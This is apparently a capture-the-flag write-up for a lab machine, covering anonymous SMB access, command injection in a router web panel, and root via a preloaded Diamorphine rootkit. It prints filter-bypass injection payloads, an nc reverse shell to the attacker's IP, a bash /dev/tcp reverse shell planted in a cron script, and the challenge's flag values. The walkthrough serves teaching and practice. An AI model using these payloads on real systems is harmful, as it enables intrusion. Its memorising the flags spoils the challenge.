# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22   | SSH     |
| 80   | HTTP    |
| 139  | SMB     |
| 445  | SMB     |



# RECONNAISSANCE
---

We got anonymous login enabled at `smb`, let's check it out:


```
smbclient -L \\\\10.10.214.108\\ -N
Can't load /etc/samba/smb.conf - run testparm to debug it
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	public          Disk
	IPC$            IPC       IPC Service (Samba 4.15.13-Ubuntu)
SMB1 disabled -- no workgroup available
```

As we can see, we got a `public` share, let's take a look:

![Pasted image 20250423162152.png](../../IMAGES/Pasted%20image%2020250423162152.png)

We got a file, let's get it and view the contents:

![Pasted image 20250423163005.png](../../IMAGES/Pasted%20image%2020250423163005.png)

We got an endpoint, let's proceed with the web application then:

![Pasted image 20250423163046.png](../../IMAGES/Pasted%20image%2020250423163046.png)

Nothing weird in here, let's go to the specified route:

```
http://10.10.214.108/myrouterpanel/
```

We can see this:

![Pasted image 20250423163143.png](../../IMAGES/Pasted%20image%2020250423163143.png)

We can test some basic stuff, for example, let's try a simple ping to `127.0.0.1` to check the behavior:

![Pasted image 20250423163528.png](../../IMAGES/Pasted%20image%2020250423163528.png)


Let's begin exploitation


# EXPLOITATION
---

As we can see, the ping goes through, based on this, we can try some command injection payloads, let's use a basic one to check the behavior:

![Pasted image 20250423163619.png](../../IMAGES/Pasted%20image%2020250423163619.png)

There seems to be some blacklist surveilling which characters we put in the `ip`, we can try modifying the payloads until we get an advanced one, let's refer to our command injection notes, for example, here are a list of characters that may be helpful:

```bash
%3b      # URL-encoded ; (semicolon)
%26      # URL-encoded & (ampersand)
%7c      # URL-encoded | (pipe)
%0a      # URL-encoded newline (\n)
%09      # URL-encoded tab (space bypass)
%20      # URL-encoded space
+        # Often treated as a space in form data
${IFS}   # Internal Field Separator (space replacement)
```

I tried using a payload from a previous machine on `HackTheBox`:

```bash
ip=8.8.8.8%0Abash%09-c%09"id"%0A&submit=
```

![Pasted image 20250423164508.png](../../IMAGES/Pasted%20image%2020250423164508.png)

There we go, it worked, let's craft a reverse shell:

```bash
ip=8.8.8.8%0Abash%09-c%09"nc -c /bin/sh 10.6.34.159 9001"%0A&submit=
```


![Pasted image 20250423164854.png](../../IMAGES/Pasted%20image%2020250423164854.png)

If we check our listener:

![Pasted image 20250423164905.png](../../IMAGES/Pasted%20image%2020250423164905.png)

There we go, we got our connection, let's proceed with privilege escalation.


# PRIVILEGE ESCALATION
---


First step is to stabilize our shell:

```sh
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

![Pasted image 20250423165109.png](../../IMAGES/Pasted%20image%2020250423165109.png)

After using linpeas, I found there is a `/usr/share/backups` directory owned by `www-data` with the group `athena`, let's take a look:

![Pasted image 20250423165916.png](../../IMAGES/Pasted%20image%2020250423165916.png)

We got a `backup.sh` file, let's look at the contents:

```sh
#!/bin/bash

backup_dir_zip=~/backup

mkdir -p "$backup_dir_zip"

cp -r /home/athena/notes/* "$backup_dir_zip"

zip -r "$backup_dir_zip/notes_backup.zip" "$backup_dir_zip"

rm /home/athena/backup/*.txt
rm /home/athena/backup/*.sh

echo "Backup completed..."
```

The script does the following:

1. Creates a backup directory atÂ `~/backup`Â (likelyÂ `/home/www-data/backup`Â since it's owned byÂ `www-data`).
    
2. CopiesÂ **all files**Â fromÂ `/home/athena/notes/*`Â into the backup directory.
    
3. Zips the backup intoÂ `notes_backup.zip`.
    
4. Deletes allÂ `.txt`Â andÂ `.sh`Â files inÂ `/home/athena/backup/`.
    
5. Prints a completion message.

But none of this is relevant, we know that `athena` may be running this as a cronjob, we can modify the contents of the file to embed a reverse shell:

```bash
# Add reverse shell payload
bash -c 'bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1' &
```

If we start our listener a wait a little bit:

![Pasted image 20250423170454.png](../../IMAGES/Pasted%20image%2020250423170454.png)

We need to stabilize our shell again:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

Let's check our sudo privileges:

![Pasted image 20250423170829.png](../../IMAGES/Pasted%20image%2020250423170829.png)

We can run something called `venom.ko`, let's have more info of it, we can do:

```
athena@routerpanel:/$ modinfo /mnt/.../secret/venom.ko
modinfo /mnt/.../secret/venom.ko
filename:       /mnt/.../secret/venom.ko
description:    LKM rootkit
author:         m0nad
license:        Dual BSD/GPL
srcversion:     93A81462832D4CF52F916D7
depends:
retpoline:      Y
name:           venom
vermagic:       5.15.0-69-generic SMP mod_unload modversions
```

As we can see, this is a rootkit written by `m0nad`, let's use GitHub:

![Pasted image 20250423171008.png](../../IMAGES/Pasted%20image%2020250423171008.png)


This rootkit refers to something called `Diamorphine`, let's check the repo:

![Pasted image 20250423171043.png](../../IMAGES/Pasted%20image%2020250423171043.png)

There we go, we got our way to get into root, since we need to send a `signal 64` to become root, we can do this:

```
sudo /usr/sbin/insmod /mnt/.../secret/venom.ko
sleep 10 & # This will show us the pid
kill -64 2865
```

![Pasted image 20250423171951.png](../../IMAGES/Pasted%20image%2020250423171951.png)

If we check our id, it doesn't seem to work, this is because the signal has been modified to `57` instead of `64` on this rootkit, we can now do it again:

```
sudo /usr/sbin/insmod /mnt/.../secret/venom.ko
sleep 10 & # This will show us the pid
kill -57 pid
```

![Pasted image 20250423174845.png](../../IMAGES/Pasted%20image%2020250423174845.png)

As seen, we are root:

```
athena@routerpanel:/$ cat /root/root.txt
aecd4a3497cd2ec4bc71a2315030bd48
```

```
athena@routerpanel:/$ cat /home/athena/user.txt
857c4a4fbac638afb6c7ee45eb3e1a28
```

![Pasted image 20250423175116.png](../../IMAGES/Pasted%20image%2020250423175116.png)

